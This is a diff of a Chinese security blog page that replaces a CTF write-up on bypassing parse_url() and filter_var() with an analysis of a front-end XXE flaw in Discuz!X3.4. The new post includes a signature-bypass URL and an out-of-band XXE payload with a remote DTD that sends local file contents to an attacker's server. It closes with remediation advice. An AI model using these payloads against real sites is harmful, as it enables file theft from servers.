@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="一道CTF的trick分析, Joker">
-    <meta name="description" content="一道CTF的trick分析">
+    <meta name="keywords" content="Discuz!X3.4前台XXE漏洞, Joker">
+    <meta name="description" content="DiscuzX代码审计">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>一道CTF的trick分析 | Joker</title>
+    <title>Discuz!X3.4前台XXE漏洞 | Joker</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -304,12 +304,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">一道CTF的trick分析</h1>
+                    <h1 class="description center-align post-title">Discuz!X3.4前台XXE漏洞</h1>
                 </div>
             </div>
         </div>
@@ -426,14 +426,23 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
+                            <a href="/tags/Discuz/">
+                                <span class="chip bg-color">Discuz</span>
                             </a>
                         
                     </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                代码审计
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -442,28 +451,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-03-17
+                    2020-03-30
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-03-17
+                    2020-03-30
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    563
+                    749
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    3 分
                 </div>
                 
 				
@@ -479,40 +488,22 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h2><p>代码如下：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token keyword">echo</span> <span class="token string">"you are hacker"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/127\.0\.0\.1$/'</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-            <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
-            <span class="token keyword">echo</span><span class="token string">'nononono'</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
-    <span class="token keyword">echo</span><span class="token string">'nonono!'</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
-<h2 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var()"></a>filter_var()</h2><p>首先看filter_var()函数的官方说明<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314224534.png" alt></p>
-<blockquote>
-<p>FILTER_VALIDATE_URL 过滤器把值作为 URL 来验证。<br>Name: “validate_url”<br>ID-number: 273<br>可能的标志：<br>FILTER_FLAG_SCHEME_REQUIRED - 要求 URL 是 RFC 兼容 URL（比如 <a href="http://example）" target="_blank" rel="noopener">http://example）</a><br>FILTER_FLAG_HOST_REQUIRED - 要求 URL 包含主机名（比如 <a href="http://www.example.com）" target="_blank" rel="noopener">http://www.example.com）</a><br>FILTER_FLAG_PATH_REQUIRED - 要求 URL 在域名后存在路径（比如 <a href="http://www.example.com/example1/test2/）" target="_blank" rel="noopener">www.example.com/example1/test2/）</a><br>FILTER_FLAG_QUERY_REQUIRED - 要求 URL 存在查询字符串（比如 “example.php?name=Peter&amp;age=37”）</p>
-</blockquote>
-<h2 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url()"></a>parse_url()</h2><p>先看官方手册<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314231824.png" alt><br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314231939.png" alt><br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314232031.png" alt><br>对于parse_url()的拆分，是有解析漏洞的，根据特定符号进行分段例如通过@分割 user 与 host<br>这样就可以伪造host<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314232827.png" alt></p>
-<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先我们要post一个url，而且host是以127.0.0.1结尾，有一个题目，是要以baidu.com结尾，这就衍生了另外的思路：买域名，或者post.baidu.com跳转<br>正常情况下，利用parse_url()的解析漏洞，其实就可以绕过了，但是在后面有<code>file_get_contens</code>的情况下，我们需要传入数据让<code>file_get_contens</code>读取，因为php对于MIME不敏感，我们可以修改text来利用data://来绕过，如：<code>data://baidu.com/plain;base64,xxxxx</code>，but,data://被ban了，看了大佬们的WP，发现可以利用<code>compress.zlib://data:@127.0.0.1/palin,让file_get_contens读取的代码</code>来绕过，<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314235825.png" alt></p>
-<p>为什么要用<code>compress.zlib://</code>没怎么弄懂，希望知道的大佬们指点一波，我分析的应该是compress.zlib://将后面的当成了要读取的文件（具体伪协议会另写一篇文章），并且根据官方手册说明</p>
-<blockquote>
-<p>compress.zlib://、 compress.bzip2:// 和 gzopen()、bzopen() 是相等的<br>尝试换成 compress.bzip2://试了一下，但是不知道为什么返回的全是空白（同求大佬指点）</p>
-</blockquote>
-<h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>这道题目大概就这些知识点和trick<br>下面再附上以为师傅的关于file_get_contens获取数据的总结截图<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200314235620.png" alt></p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">【SSRF】如何绕过filter_var(), preg_match() 和 parse_url()</a><br><a href="https://blog.dyboy.cn/websecurity/154.html#title-3" target="_blank" rel="noopener">一道CTF题目的探究</a></p>
+                <h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p>比较幸运，刚学完XXE漏洞，转身给我爆了一个XXE。不过有php版本限制</p>
+<h2 id="0x02漏洞环境"><a href="#0x02漏洞环境" class="headerlink" title="0x02漏洞环境"></a>0x02漏洞环境</h2><p>Discuz!X3.4最新版<br>php5.4.45</p>
+<h2 id="0x03影响范围"><a href="#0x03影响范围" class="headerlink" title="0x03影响范围"></a>0x03影响范围</h2><p>漏洞点出在dz中的微信接口处，经过测试需要PHP&lt;=5.4.45因为高版本中的<code>simplexml_load_string</code>已经不在默认加载LIBXML_NOENT，合理猜测所有有微信插件的版本都可能存在，因为没找到旧版本就没测试。</p>
+<h2 id="0x04漏洞分析"><a href="#0x04漏洞分析" class="headerlink" title="0x04漏洞分析"></a>0x04漏洞分析</h2><p>漏洞文件：/source/plugin/wechat/wechat.lib.class.php<br><img src="/1944236470/1.png" alt><br>可以发现<code>simplexml_load_string</code>中的<code>$postdata</code>我们可以控制（可以看一下<code>simplexml_load_string</code>新版本和旧版本的区别），而到这只经过了两次<code>_checkSignature</code>，跟进看一下<br><img src="/1944236470/2.png" alt><br>大致就是进行一个token的检验，其中参数可控，而如果我们知道token的值就能进行伪造，看一下token是如何传进来的，发现是在实体化WeChatServer类的时候进行的初始化<br><img src="/1944236470/3.png" alt><br>直接全局搜索<code>WeChatServer</code><br>在文件/source/plugin/mobile/api/4/wechat.php中进行了实体化<br><img src="/1944236470/4.png" alt><br><code>$_G[&#39;wechat&#39;][&#39;setting&#39;][&#39;wechat_token&#39;]</code>就是我们的token，是由<code>$_G[&#39;setting&#39;][&#39;mobilewechat&#39;]</code>反序列化来的，我们调试一下看看mobilewechat的值，先找一下入口文件，位置在<code>/source/plugin/mobile/mobilie.php</code><br><img src="/1944236470/5.png" alt><br>构造url:<code>http://127.0.0.1/source/plugin/mobile/mobile.php?module=wechat</code><br><img src="/1944236470/6.png" alt><br>可以发现默认的mobilewechat是null，而这样的话token也是null，<br><img src="/1944236470/7.png" alt><br>直接跟进到<code>_checkSignature</code>函数，看<code>$tmpStr</code>的值<br><img src="/1944236470/8.png" alt><br>可以看到<code>$tmpStr</code>的值就是一个3个空值数组的sha1值，此时<code>$tmpStr</code>可知，可直接通过<code>$signatur</code>传值绕过。至此，我们就可以通过<code>$postdata</code>穿payload进行XXE。我们在回头看一下wexin_token的值是怎么产生的<br>文件位置<code>source\plugin\wechat\install\checkupdate.inc.php</code><br><img src="/1944236470/9.png" alt><br>回溯发现，wechat_token是随机产生的一个16位字符，不可控。<br><img src="/1944236470/10.png" alt><br>这里也可以知道为什么token为null了，只有在安装了微信插件的时候才会生成token，而默认配置则是空，这就能直接前台xxe了<br><img src="/1944236470/11.jpg" alt><br>再继续看，既然token不可控，在看是否能获取。发现，在后台微信设置处能进行设置，但这就要后台权限了。懒得上图了……<br>总结：攻击思路两条，1.默认配置–》token=null–》xxe      2.开启微信插件–》后台–》获取token–&gt;xxe</p>
+<h2 id="0x05漏洞复现"><a href="#0x05漏洞复现" class="headerlink" title="0x05漏洞复现"></a>0x05漏洞复现</h2><p>不多bb，无回显的xxe，需要oob。<br>url=<code>http://www.123.com/source/plugin/mobile/mobile.php?module=wechat&amp;signature=da39a3ee5e6b4b0d3255bfef95601890afd80709</code></p>
+<p>然后post：</p>
+<pre><code>&lt;!DOCTYPE convert [ 
+&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;
+%remote;%int;%send;
+]&gt;</code></pre><p>test.dtd：</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/test.txt&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:10888?p=%file;&#39;&gt;&quot;&gt;</code></pre><p>可以看到vps上成功拿到了test.txt的base64后的数据<br><img src="/1944236470/11.png" alt></p>
+<h2 id="0x06漏洞修复"><a href="#0x06漏洞修复" class="headerlink" title="0x06漏洞修复"></a>0x06漏洞修复</h2><ol>
+<li>禁用外部实体<br><code>libxml_disable_entity_loader(true);</code></li>
+<li>黑名单过滤<br>对一下字符进行过滤<br><code>&lt;!DOCTYPE、&lt;!ENTITY、SYSTEM、PUBLIC</code></li>
+</ol>
 <hr>
 <p>版权声明：</p>
 <p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p>
@@ -542,7 +533,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://blog.j0k3r.cn/4215173263.html">http://blog.j0k3r.cn/4215173263.html</a>
+                    <a href="http://blog.j0k3r.cn/1944236470.html">http://blog.j0k3r.cn/1944236470.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -580,8 +571,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
+                                <a href="/tags/Discuz/">
+                                    <span class="chip bg-color">Discuz</span>
                                 </a>
                             
                         </div>
@@ -622,46 +613,48 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/3755095433.html">
+                <a href="/1944236470.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="ssrf学习笔记（持续更新……）">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="Discuz!X3.4前台XXE漏洞">
                         
-                        <span class="card-title">ssrf学习笔记（持续更新……）</span>
+                        <span class="card-title">Discuz!X3.4前台XXE漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ssrf学习笔记
+                            DiscuzX代码审计
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-17
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-30
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    学习笔记
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/ssrf/">
-                        <span class="chip bg-color">ssrf</span>
+                    <a href="/tags/Discuz/">
+                        <span class="chip bg-color">Discuz</span>
                     </a>
                     
                 </div>
@@ -675,24 +668,24 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/1877436815.html">
+                <a href="/3842592324.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="命令执行绕过">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="XXE漏洞学习笔记">
                         
-                        <span class="card-title">命令执行绕过</span>
+                        <span class="card-title">XXE漏洞学习笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            命令执行绕过
+                            XXE漏洞学习笔记
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-17
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-27
                             </span>
                         <span class="publish-author">
                             
@@ -705,8 +698,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
-                        <span class="chip bg-color">命令执行</span>
+                    <a href="/tags/XXE%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">XXE漏洞</span>
                     </a>
                     
                 </div>
